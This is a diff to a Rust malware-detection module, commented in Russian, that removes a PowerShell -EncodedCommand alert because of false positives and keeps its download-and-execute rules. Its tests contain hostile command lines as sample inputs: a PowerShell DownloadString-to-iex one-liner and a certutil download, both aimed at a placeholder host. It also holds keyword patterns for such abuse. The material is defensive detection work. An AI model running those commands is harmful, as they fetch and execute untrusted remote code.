@@ -3,7 +3,7 @@
 //! Сигналы (правила в `Evaluator`, не зависят от ОС и покрыты тестами):
 //!   • майнер: процесс без подписи держит заметную нагрузку на процессор минуты подряд, особенно с соединением на порт пула;
 //!   • запуск неподписанной программы из Temp/Загрузок/Public;
-//!   • приёмы вирусов: `powershell -enc`, загрузка и запуск из сети через certutil/bitsadmin/mshta/regsvr32;
+//!   • приёмы вирусов: PowerShell скачивает и запускает код, загрузка и запуск из сети через certutil/bitsadmin/mshta/regsvr32;
 //!   • цепочки «Word/Excel/PDF → cmd/PowerShell/wscript»;
 //!   • новые записи автозапуска из временных папок или с приёмами из предыдущего пункта;
 //!   • шифровальщик: массовое переименование файлов в Документах/Рабочем столе/Изображениях, файлы с «выкупными» расширениями.
@@ -30,7 +30,7 @@ const NET_EVERY: u64 = 3; // раз в 3 выборки (15 с)
 const AUTORUN_EVERY: u64 = 24; // раз в 2 минуты
 const MAX_SIGCHECKS_PER_CYCLE: usize = 2;
 /// Одно и то же правило по одной и той же программе — не чаще раза в 10 минут. id тревоги содержит PID, а
-/// у каждого запуска он новый: без паузы скрипт, который дёргает powershell -EncodedCommand в цикле, давал тост на каждый вызов.
+/// у каждого запуска он новый: без паузы скрипт, который запускает одну и ту же утилиту в цикле, давал тост на каждый вызов.
 const REPEAT_SECS: u64 = 600;
 
 static RUNNING: AtomicBool = AtomicBool::new(false);
@@ -130,9 +130,9 @@ pub fn lolbin_abuse(name: &str, cmd: &str) -> Option<&'static str> {
     let has = |s: &str| c.contains(s);
     match n.as_str() {
         "powershell" | "pwsh" => {
-            if has("-enc ") || has("-encodedcommand") || has("-e jab") || has("-e sqb") {
-                Some("PowerShell запускает закодированную команду (-enc)")
-            } else if (has("downloadstring") || has("downloadfile") || has("invoke-webrequest") || has("iwr ")) && (has("iex") || has("invoke-expression") || has("start-process")) {
+            // Голый -EncodedCommand не считаем признаком: так штатно запускают команды Claude Code, установщики и
+            // инструменты разработчика — правило давало только ложные тревоги. Загрузку и раскодирование ловят правила ниже.
+            if (has("downloadstring") || has("downloadfile") || has("invoke-webrequest") || has("iwr ")) && (has("iex") || has("invoke-expression") || has("start-process")) {
                 Some("PowerShell скачивает и сразу запускает код из сети")
             } else if (has("-windowstyle hidden") || has("-w hidden") || has("-nop")) && (has("http") || has("frombase64string")) {
                 Some("PowerShell в скрытом окне загружает или раскодирует данные")
@@ -842,7 +842,7 @@ mod tests {
 
     #[test]
     fn lolbin_rules() {
-        assert!(lolbin_abuse("powershell.exe", "powershell -nop -enc SQBFAFgA").is_some());
+        assert!(lolbin_abuse("powershell.exe", "powershell -NoProfile -NonInteractive -EncodedCommand SQBFAFgA").is_none());
         assert!(lolbin_abuse("powershell.exe", "powershell -c (New-Object Net.WebClient).DownloadString('http://x/a') | iex").is_some());
         assert!(lolbin_abuse("powershell.exe", "powershell Get-ChildItem").is_none());
         assert!(lolbin_abuse("certutil.exe", "certutil -urlcache -f http://x/a.exe a.exe").is_some());
@@ -856,7 +856,7 @@ mod tests {
         let mut ev = Evaluator::default();
         let ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
         let mut run = |pid| {
-            let mut x = s("powershell.exe", ps, "powershell -NoProfile -EncodedCommand SQBFAFgA", "node.exe", 1.0);
+            let mut x = s("powershell.exe", ps, "powershell -c (New-Object Net.WebClient).DownloadString('http://x/a') | iex", "node.exe", 1.0);
             x.pid = pid;
             ev.evaluate(&x)
         };
@@ -915,7 +915,7 @@ mod tests {
     fn trusted_is_ignored() {
         let mut ev = Evaluator::default();
         ev.trusted.insert("c:\\tools\\crunch.exe".into());
-        let mut x = s("crunch.exe", "C:\\Tools\\crunch.exe", "powershell -enc AAAA", "explorer.exe", 90.0);
+        let mut x = s("crunch.exe", "C:\\Tools\\crunch.exe", "powershell -c (New-Object Net.WebClient).DownloadString('http://x/a') | iex", "explorer.exe", 90.0);
         x.name = "powershell.exe".into();
         assert!(ev.evaluate(&x).is_empty());
     }
